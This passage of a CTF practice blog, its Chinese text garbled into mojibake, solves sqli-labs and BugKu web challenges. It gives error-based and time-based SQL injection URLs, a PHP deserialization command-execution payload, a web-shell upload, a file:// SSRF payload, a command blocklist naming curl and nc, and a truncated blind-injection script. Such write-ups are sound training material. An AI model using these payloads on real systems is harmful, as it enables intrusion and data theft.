title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=-1&#x27;))<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-41"><a href="#æºç åˆ†æ-41" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-63"><a href="#æ‰‹åŠ¨æ³¨å…¥-63" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å»¶æ—¶æ³¨å…¥ï¼ˆå¯ä»¥ä½¿ç”¨è„šæœ¬ï¼‰</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=1&#x27;)<span class="attribute">and</span> If(ascii(substr((<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,sleep(<span class="number">10</span>))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-42"><a href="#æºç åˆ†æ-42" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-64"><a href="#æ‰‹åŠ¨æ³¨å…¥-64" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒLess-62ï¼Œä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚</p><h4 id="æºç åˆ†æ-43"><a href="#æºç åˆ†æ-43" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-65"><a href="#æ‰‹åŠ¨æ³¨å…¥-65" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒLess-62ï¼Œä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚</p><h4 id="æºç åˆ†æ-44"><a href="#æºç åˆ†æ-44" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-66"><a href="#æ‰‹åŠ¨æ³¨å…¥-66" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒLess-62ï¼Œä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚</p><h4 id="æºç åˆ†æ-45"><a href="#æºç åˆ†æ-45" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="å¸¸ç”¨æ–¹æ³•æ€»ç»“"><a href="#å¸¸ç”¨æ–¹æ³•æ€»ç»“" class="headerlink" title="å¸¸ç”¨æ–¹æ³•æ€»ç»“"></a>å¸¸ç”¨æ–¹æ³•æ€»ç»“</h2><h3 id="ä¸€èˆ¬æµç¨‹"><a href="#ä¸€èˆ¬æµç¨‹" class="headerlink" title="ä¸€èˆ¬æµç¨‹"></a>ä¸€èˆ¬æµç¨‹</h3><p>Mysql æœ‰ä¸€ä¸ªç³»ç»Ÿæ•°æ®åº“<code>information_schema</code>ï¼Œå­˜å‚¨ç€æ‰€æœ‰çš„æ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯ï¼Œä¸€èˆ¬çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨è¯¥è¡¨å¯ä»¥è¿›è¡Œä¸€æ¬¡å®Œæ•´çš„æ³¨å…¥ã€‚ä»¥ä¸‹ä¸ºä¸€èˆ¬çš„æµç¨‹ã€‚ </p><h4 id="çŒœæ•°æ®åº“"><a href="#çŒœæ•°æ®åº“" class="headerlink" title="çŒœæ•°æ®åº“"></a>çŒœæ•°æ®åº“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line">select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="çŒœæŸåº“çš„æ•°æ®è¡¨"><a href="#çŒœæŸåº“çš„æ•°æ®è¡¨" class="headerlink" title="çŒœæŸåº“çš„æ•°æ®è¡¨"></a>çŒœæŸåº“çš„æ•°æ®è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—"><a href="#çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—" class="headerlink" title="çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—"></a>çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br><span class="line">select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;xxxxx&#x27;</span><br></pre></td></tr></table></figure><h4 id="è·å–æŸåˆ—çš„å†…å®¹"><a href="#è·å–æŸåˆ—çš„å†…å®¹" class="headerlink" title="è·å–æŸåˆ—çš„å†…å®¹"></a>è·å–æŸåˆ—çš„å†…å®¹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select xxxx from xxxxxx </span><br></pre></td></tr></table></figure><blockquote><p>ä¸Šè¿°çŸ¥è¯†å‚è€ƒç”¨ä¾‹ï¼šless1-less4</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½• 4</title>
      <link href="/2022/05/05/BugKu-Web4/"/>
      <url>/2022/05/05/BugKu-Web4/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•-4"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•-4" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½• 4"></a>BugKu Web åˆ·é¢˜è®°å½• 4</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/HelloCTF/p/13044403.html">ctfä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></p><p><a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p><a href="https://blog.csdn.net/plant1234/article/details/118033711">sqlæ³¨å…¥</a></p></blockquote><h2 id="ä½ ä»å“ªé‡Œæ¥"><a href="#ä½ ä»å“ªé‡Œæ¥" class="headerlink" title="ä½ ä»å“ªé‡Œæ¥"></a>ä½ ä»å“ªé‡Œæ¥</h2><p>æ·»åŠ <code>Referer</code>å­—æ®µå³å¯ã€‚</p><p><img src="https://s2.loli.net/2022/05/05/UEJoHjpm5KwqFAP.png" alt="where.png"></p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>æ ¹æ®æç¤ºå¾—çŸ¥æ˜¯md5ç¢°æ’ï¼Œæ•…æ„é€ payloadå¦‚ä¸‹å³å¯è·å¾—flagã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:14728/index.php?a=s878926199a</span><br></pre></td></tr></table></figure><h2 id="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"><a href="#ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™" class="headerlink" title="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"></a>ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™</h2><p>æ·»åŠ <code>client-ip</code>å­—æ®µå³å¯</p><p><img src="https://s2.loli.net/2022/05/05/mYO5zAiGuXM1skr.png" alt="clientip.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>è®¿é—®<code>http://114.67.175.224:12650/flag.txt</code>å¾—åˆ°<code>bugku</code>,ç„¶åæ„é€ payloadå³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:12650/?ac=bugku&amp;fn=flag.txt</span><br></pre></td></tr></table></figure><h2 id="å®‰æ…°å¥–"><a href="#å®‰æ…°å¥–" class="headerlink" title="å®‰æ…°å¥–"></a>å®‰æ…°å¥–</h2><p>F12æŸ¥çœ‹æºç ï¼Œå‘ç°base64ç¼–ç ï¼Œè§£ç åä¸º<code>backups</code>ï¼Œç”¨dirsearchæ‰«æä¸€éå‘ç°æœ‰bakæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å³å¯è·å¾—æºç </p><p><img src="https://s2.loli.net/2022/05/05/esNlIwZaiT1OxQg.png" alt="anwei1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15293/?code=O:3:%22ctf%22:3:&#123;s:11:%22%00*%00username%22;s:5:%22admin%22;s:6:%22%00*%00cmd%22;s:12:%22tac%20flag.php%22;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>__wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨ï¼Œç»•è¿‡å®ƒä»…éœ€è¦å°†ä¸Šé¢çš„å¯¹è±¡å±æ€§ä¸ªæ•°å€¼æ”¹å¾—æ¯”çœŸå®å¯¹è±¡å¤§å³å¯ã€‚</p></blockquote><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>ä¿®æ”¹å­—æ®µä¿¡æ¯ä¸Šä¼ æ–‡ä»¶</p><p><img src="https://s2.loli.net/2022/05/05/QeUturNifLd75oY.png" alt="up1.png"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œå¯»æ‰¾flag</p><p><img src="https://s2.loli.net/2022/05/05/GU3BfPvWMe1Z7ns.png" alt="up2.png"></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p></blockquote><h2 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h2><p>è§£å‹åè·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é‡Œé¢æ˜¯ä¸ªåŠ å¯†å‡½æ•°ï¼Œæ•…æ„é€ è§£å¯†å‡½æ•°å³å¯ï¼Œexpå¦‚ä¸‹ï¼ˆæ³¨æ„æäº¤çš„Flagå½¢å¼ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>;  <span class="comment">//æç¤ºä¸­çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line"><span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// str = (data[i] + char[i])%128</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>((<span class="number">128</span> + <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decrypt</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«2"><a href="#æ–‡ä»¶åŒ…å«2" class="headerlink" title="æ–‡ä»¶åŒ…å«2"></a>æ–‡ä»¶åŒ…å«2</h2><p>F12æŸ¥çœ‹å‘ç°æœ‰upload.phpï¼Œç„¶åç”¨burpè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p><img src="https://s2.loli.net/2022/05/05/YtUdriGFB6R3D8b.png" alt="up2_1.png"></p><p>ç”¨èšå‰‘è¿›è¡Œè¿æ¥å¹¶å¯»æ‰¾flag</p><p><img src="https://s2.loli.net/2022/05/05/eaqdkCrXstAuH2j.png" alt="up2_2.png"></p><p><img src="https://s2.loli.net/2022/05/05/GnvJHQrsBz1jAIh.png" alt="up2_3.png"></p><h2 id="éœ€è¦ç®¡ç†å‘˜"><a href="#éœ€è¦ç®¡ç†å‘˜" class="headerlink" title="éœ€è¦ç®¡ç†å‘˜"></a>éœ€è¦ç®¡ç†å‘˜</h2><p>ç”¨dirsearchæ‰«ä¸€é</p><p><img src="https://s2.loli.net/2022/05/05/IWOqanhjeZNlGHt.png" alt="admin1.png"></p><p>è¿›å…¥robots.txt</p><p><img src="https://s2.loli.net/2022/05/05/RBtlIYqK7mAHnME.png" alt="admin2.png"></p><p>è¿›å…¥resusl.php</p><p><img src="https://s2.loli.net/2022/05/05/OFGyhVxZXEdBCR3.png" alt="admin3.png"></p><p>è§‚å¯Ÿé¡µé¢å‘ç°éœ€è¦è¾“å…¥å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨burpsuiteçˆ†ç ´ä¹Ÿå¯ä»¥æ ¹æ®é¢˜ç›®åç§°çŒœæµ‹å¾—åˆ°ï¼ˆå¯†ç æ˜¯adminï¼‰</p><p><img src="https://s2.loli.net/2022/05/05/eKagOyH9o6IXpdF.png" alt="admin4.png"></p><h2 id="newphp"><a href="#newphp" class="headerlink" title="newphp"></a>newphp</h2><p>æ‰“å¼€ç½‘é¡µå³å¯è·å¾—æºç ï¼Œæ ¹æ®æºç æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/VqFjp2Qb4TcMxeA.png" alt="newphp1.png"></p><p>base64è§£ç åå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure><p>è®¿é—®è¯¥é¡µé¢</p><p><img src="https://s2.loli.net/2022/05/05/8TJwkz5a43SfoYn.png" alt="newphp2.png"></p><p>æ„é€ payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11918/index.cgi?name=%20file:////flag</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/qB5XHZveU3RwNgp.png" alt="newphp3.png"></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p></blockquote><h2 id="ç‚¹loginå’‹æ²¡ååº”"><a href="#ç‚¹loginå’‹æ²¡ååº”" class="headerlink" title="ç‚¹loginå’‹æ²¡ååº”"></a>ç‚¹loginå’‹æ²¡ååº”</h2><p>è¿›å…¥åæŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°æœ‰<code>href=&quot;admin.css&quot;</code>ï¼Œç‚¹è¿›å»åå‘ç°ç¬¬ä¸€è¡Œæœ‰æç¤º<code>/* try ?29614 */</code>ï¼ŒåŠ å…¥åç¼€åå³å¯è·å¾—æºä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$KEY=&#x27;ctf.bugku.com&#x27;;</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie = $_COOKIE[&#x27;BUGKU&#x27;];</span><br><span class="line">if(isset($_GET[&#x27;29614&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>å®¡è®¡åå‘ç°æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ä½¿å¾—å…¶ååºåˆ—åŒ–åä¸<code>$KEY</code>çš„å€¼æ’ç­‰å³å¯</p><p><img src="https://s2.loli.net/2022/05/05/1WHcKEZJAsFgIVz.png" alt="login.png"></p><h2 id="éƒ½è¿‡æ»¤äº†"><a href="#éƒ½è¿‡æ»¤äº†" class="headerlink" title="éƒ½è¿‡æ»¤äº†"></a>éƒ½è¿‡æ»¤äº†</h2><p>ç™»å½•ç•Œé¢çš„è´¦å·ä¸€æ å¯ä»¥è¢«sqlæ³¨å…¥ï¼Œç¼–å†™è„šæœ¬è·å–å¯†ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_data</span>(<span class="params">uname,data</span>):</span><br><span class="line">data[<span class="string">&#x27;uname&#x27;</span>] = uname</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">len_of_passwd</span>(<span class="params">url,data,cookie,uname</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;^(length(passwd)=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)^&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> 